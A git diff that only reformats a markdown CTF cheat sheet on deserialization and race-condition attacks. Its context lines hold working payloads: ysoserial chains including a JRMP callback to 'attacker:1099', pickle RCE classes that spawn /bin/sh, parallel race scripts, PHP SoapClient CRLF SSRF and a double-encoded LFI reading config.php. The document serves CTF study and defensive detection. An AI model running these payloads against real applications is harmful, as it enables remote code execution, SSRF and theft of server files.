@@ -3,7 +3,6 @@
 For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [server-side.md](server-side.md).
 
 ## Table of Contents
-
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial)
 - [Python Pickle Deserialization](#python-pickle-deserialization)
 - [Race Conditions (Time-of-Check to Time-of-Use)](#race-conditions-time-of-check-to-time-of-use)
@@ -17,14 +16,13 @@ For core injection attacks (SQLi, SSTI, SSRF, XXE, command injection), see [serv
 - [PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)](#php-unserialize--double-url-encoding-curl-lfi-fireshell-ctf-2019)
 - [Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)](#python-pickle-rce-wrapped-in-rot13base64-tamuctf-2019)
 
-------
+---
 
 ## Java Deserialization (ysoserial)
 
 **Pattern:** Java apps using `ObjectInputStream.readObject()` on untrusted input. Serialized Java objects in cookies, POST bodies, or ViewState (base64-encoded, starts with `rO0AB` or hex `aced0005`).
 
 **Detection:**
-
 - Base64 decode suspicious blobs — Java serialized data starts with magic bytes `AC ED 00 05`
 - Search for `ObjectInputStream`, `readObject`, `readUnshared` in source
 - Content-Type `application/x-java-serialized-object`
@@ -53,20 +51,18 @@ curl -X POST http://target/api -H 'Content-Type: application/x-java-serialized-o
 ```
 
 **Bypass filters:**
-
 - If `ObjectInputStream` subclass blocklists specific classes, try alternative chains
 - `ysoserial-modified` and `GadgetProbe` enumerate available gadget classes
 - JNDI injection (Java Naming and Directory Interface): `java -jar ysoserial.jar JRMPClient 'attacker:1099'` + `marshalsec` JNDI server
 - For Java 17+ (module system restrictions): look for application-specific gadgets or Jackson/Fastjson deserialization instead
 
-------
+---
 
 ## Python Pickle Deserialization
 
 **Pattern:** Python apps deserializing untrusted data with `pickle.loads()`, `pickle.load()`, or `shelve`. Common in Flask/Django session cookies, cached objects, ML model files (`.pkl`), Redis-stored objects.
 
 **Detection:**
-
 - Base64 blobs containing `\x80\x04\x95` (pickle protocol 4) or `\x80\x05\x95` (protocol 5)
 - Source code: `pickle.loads()`, `pickle.load()`, `_pickle`, `shelve.open()`, `joblib.load()`, `torch.load()`
 - Flask sessions with `pickle` serializer (vs default `json`)
@@ -95,13 +91,12 @@ class ExecRCE:
 ```
 
 **Bypass restricted unpicklers:**
-
 - `RestrictedUnpickler` may allowlist specific modules — chain through allowed classes
 - If `builtins` allowed: `(__builtins__.__import__, ('os',))` then chain `.system()`
 - YAML deserialization (`yaml.load()` without `Loader=SafeLoader`) has similar RCE via `!!python/object/apply:os.system`
 - NumPy `.npy`/`.npz` files: `numpy.load(allow_pickle=True)` triggers pickle
 
-------
+---
 
 ## Race Conditions (Time-of-Check to Time-of-Use)
 
@@ -127,7 +122,6 @@ asyncio.run(race('http://target/api/transfer',
 ```
 
 **Common CTF race condition targets:**
-
 - **Double-spend / balance bypass:** Transfer or purchase endpoint checked `if balance >= amount` → send 50 simultaneous transfers, all see original balance
 - **Coupon/code reuse:** Single-use codes validated then marked used → redeem simultaneously before mark
 - **Registration uniqueness:** `if not user_exists(name)` → register same username concurrently, one overwrites the other (admin account takeover)
@@ -141,13 +135,12 @@ seq 50 | parallel -j50 curl -s -X POST http://target/api/redeem \
 ```
 
 **Detection in source code:**
-
 - Non-atomic read-then-write patterns without locks/transactions
 - `SELECT ... UPDATE` without `FOR UPDATE` or serializable isolation
 - File operations: `if os.path.exists()` then `open()` (classic TOCTOU)
 - Redis `GET` then `SET` without `WATCH`/`MULTI`
 
-------
+---
 
 ## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)
 
@@ -172,7 +165,7 @@ payload = pickle.dumps(Redirect())[:-1] + pickle.dumps(Execute())
 
 **When to use:** Remote pickle deserialization where command output is not returned. Chain `dup2` first to redirect stdout/stderr to the socket, then execute commands.
 
-------
+---
 
 ## Java XMLDecoder Deserialization RCE (HackIM 2016)
 
@@ -192,7 +185,7 @@ Java's `XMLDecoder` automatically instantiates classes and invokes methods from 
 
 **Key insight:** Unlike binary Java deserialization, XMLDecoder provides a text-based gadget-free path to RCE — no gadget chain needed.
 
-------
+---
 
 ## .NET JSON TypeNameHandling Deserialization (DefCamp 2017)
 
@@ -247,7 +240,6 @@ print(r.text)
 ```
 
 **Gadget chains for RCE (ysoserial.net):**
-
 ```bash
 # Generate Json.NET payload with ysoserial.net:
 ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
@@ -258,7 +250,7 @@ ysoserial.exe -g ObjectDataProvider -f Json.Net -c "calc.exe"
 
 **Key insight:** `$type` in Json.NET can instantiate any class in the loaded assemblies. Any class with dangerous constructors, implicit conversions, or settable properties that trigger side effects becomes an attack surface. Use `ysoserial.net` to enumerate known gadget chains. Defense: use `TypeNameHandling.None` (default) and a custom `ISerializationBinder` allowlist.
 
-------
+---
 
 ## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)
 
@@ -273,7 +265,6 @@ $_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
 ```
 
 **How it works:**
-
 1. Application serializes user input into `s:170:"wherewhere...PAYLOAD";`
 2. Filter replaces each "where" (5) with "hacker" (6), adding 1 byte per occurrence
 3. After replacement, actual string is longer than the serialized length field
@@ -281,14 +272,13 @@ $_POST['nickname[]'] = str_repeat("where", strlen($payload)) . $payload;
 
 **Key insight:** Any post-serialization string expansion or contraction creates exploitable length mismatches for object injection. Look for word filters, censorship, or sanitization applied after `serialize()` but before storage/`unserialize()`.
 
-------
+---
 
 ### PHP SoapClient CRLF SSRF via __call() Deserialization (N1CTF 2018)
 
 **Pattern:** When PHP deserializes a `SoapClient` object and a non-existent method is called on it, the `__call()` magic method fires an HTTP request. CRLF injection in the `uri` parameter allows crafting arbitrary HTTP requests to localhost (SSRF). This turns any deserialization sink + method call into a full SSRF primitive.
 
 **How it works:**
-
 1. Attacker crafts a serialized `SoapClient` with CRLF-injected `uri` parameter
 2. Application deserializes the object (via `unserialize()`, session handler, or other deserialization sink)
 3. When any undefined method is called on the deserialized object, `__call()` triggers
@@ -329,7 +319,6 @@ echo serialize(new SoapClient(null, $payload));
 ```
 
 **Common trigger chains:**
-
 ```text
 unserialize(user_input) → $obj->anyMethod() → SoapClient::__call() → HTTP request
 session_start() with custom handler → SoapClient in session → __call() on access
@@ -337,7 +326,7 @@ session_start() with custom handler → SoapClient in session → __call() on ac
 
 **Key insight:** PHP's SoapClient `__call()` magic method fires HTTP requests when any undefined method is called. CRLF injection in the URI parameter smuggles complete HTTP requests, enabling authenticated SSRF to localhost. This is especially powerful when combined with other PHP deserialization vectors (session handlers, `phar://` wrappers) since `SoapClient` is a built-in PHP class requiring no additional libraries. Look for any code path where a deserialized object has a method called on it.
 
-------
+---
 
 ## Java TiedMapEntry + LazyMap + Reflection HashMap Patch (Trend Micro 2018)
 
@@ -374,7 +363,7 @@ byte[] payload = out.toByteArray();
 
 **References:** Trend Micro CTF 2018 — Raimund Genes Cup Misc 300, writeup 11293
 
-------
+---
 
 ## Werkzeug SecureCookie Pickle RCE after SECRET_KEY Leak (CSAW 2018 Finals)
 
@@ -390,14 +379,13 @@ class Pwn:
 
 cookie = SecureCookie({'name': Pwn()}, SECRET_KEY).serialize()
 # Set Cookie: session=<cookie> and read the flag from the response
-
 ```
 
 **Key insight:** Any framework that mixes `pickle` with HMAC-signed cookies is a SECRET_KEY leak away from RCE. Flask's default `itsdangerous` uses JSON, but older apps on `SecureCookie` or custom signers still ship pickle.
 
 **References:** CSAW 2018 Finals — NekoCat, writeups 12130, 12144
 
-------
+---
 
 ## PHP unserialize + Double URL Encoding curl LFI (FireShell CTF 2019)
 
@@ -413,19 +401,16 @@ class SHITS {
 // "file:///var/www/html/config.php" (31) -> "file:///var/www/html/config%252ephp" (35 bytes on the wire,
 // 33 chars after the first decode), so set s:33 in the serialized blob.
 print str_replace('.', '%252e', urlencode(serialize(new SHITS)));
-
 ```
-
 ```http
 GET /?gg=O%3A5%3A%22SHITS%22%3A5%3A%7B...s%3A33%3A%22file%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fconfig%252ephp%22...%7D
-
 ```
 
 **Key insight:** When a filter uses `strpos`/`preg_match` *before* URL decoding but the downstream consumer decodes again, double-encoded payloads bypass text-based blacklists. With PHP `unserialize`, remember the `s:<len>` prefix must match the byte count *after* PHP's first URL decode (33 here, not 31 or 35) or the object fails to deserialize silently.
 
 **References:** FireShell CTF 2019 — Vice, writeup 13221
 
-------
+---
 
 ## Python Pickle RCE Wrapped in ROT13(Base64) (TAMUctf 2019)
 
@@ -448,13 +433,11 @@ class RunBinSh:
 
 print(make_backup(RunBinSh()))
 # -> tNAwp3IvpUWiL2Im... paste into the "Load your backed up list" prompt
-
 ```
-
 Send the output into the app's load endpoint; pickle instantiates `subprocess.Popen(('/bin/sh',))` on deserialize and you land in a shell.
 
 **Key insight:** Obfuscation layers like ROT13, hex, zlib, or XOR do not change the pickle threat model — just compose the inverse transforms before sending. Identify the wrapper by round-tripping a known value (e.g. encode an empty list locally, compare against the server output); any 1:1 byte-for-byte mapping is a substitution cipher and trivially invertible.
 
 **References:** TAMUctf 2019 — VeggieTales, writeup 13424
 
-------
+---
